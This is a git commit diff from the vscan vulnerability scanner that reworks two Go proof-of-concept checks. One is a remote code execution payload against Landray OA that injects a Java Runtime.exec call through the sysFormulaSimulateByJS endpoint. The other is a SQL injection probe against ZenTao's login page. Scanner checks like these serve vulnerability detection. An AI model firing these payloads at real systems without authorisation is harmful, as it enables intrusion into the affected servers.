7214aad1f6da7c13bfbe9eb70e5ceba288cdc342
tuzkizki@outlook.com <1393191057@qq.com>
2022-09-13 15:51:56 +0800

    classify

--- pocs_go/landray/Landray_RCE.go
+++ pocs_go/landray/Landray_RCE.go
@@ -2,25 +2,20 @@ package landray
 
 import (
 	"fmt"
-	"time"
+	"strings"
 
 	"github.com/veo/vscan/pkg"
 )
 
 func Landray_RCE(u string) bool {
-	if pkg.CeyeApi != "" && pkg.CeyeDomain != "" {
-		randomstr := pkg.RandomStr()
-		payload := fmt.Sprintf(`s_bean=sysFormulaSimulateByJS&script=function test(){ return java.lang.Runtime};r=test();r.getRuntime().exec("ping -c 4 %s")&type=1`, randomstr+"."+pkg.CeyeDomain)
+	payload := "s_bean=sysFormulaSimulateByJS&script=function%20test(){return%20java.lang.Runtime};r=test();r.getRuntime().exec(\"echo%20yes\")&type=1"
 
-		header := make(map[string]string)
-		header["Connection"] = "close"
-
-		pkg.HttpRequset(u+"/data/sys-common/datajson.js?"+payload, "GET", "", false, nil)
-		time.Sleep(3 * time.Second)
-		if pkg.Dnslogchek(randomstr) {
+	if resp, err := pkg.HttpRequset(u+"/data/sys-common/datajson.js?"+payload, "GET", "", false, nil); err == nil {
+		if strings.Contains(resp.Body, "模拟通过") {
 			pkg.GoPocLog(fmt.Sprintf("Found vuln Landray OA RCE|%s\n", u))
 			return true
 		}
 	}
+
 	return false
 }
--- pocs_go/zentao/CNVD_2022_42853.go
+++ pocs_go/zentao/CNVD_2022_42853.go
@@ -10,7 +10,7 @@ import (
 // zentao/user-login.html SQL注入
 
 func CNVD_2022_42853(u string) bool {
-	payload := "account=admin%27%2Band%2B%28select%2Bextractvalue%281%2Cconcat%280x7e%2C%28MD5%28110%29%29%2C0x7e%29%29%29%23"
+	payload := "account='"
 
 	header := make(map[string]string)
 	header["Referer"] = u + "/zentao/user-login.html"
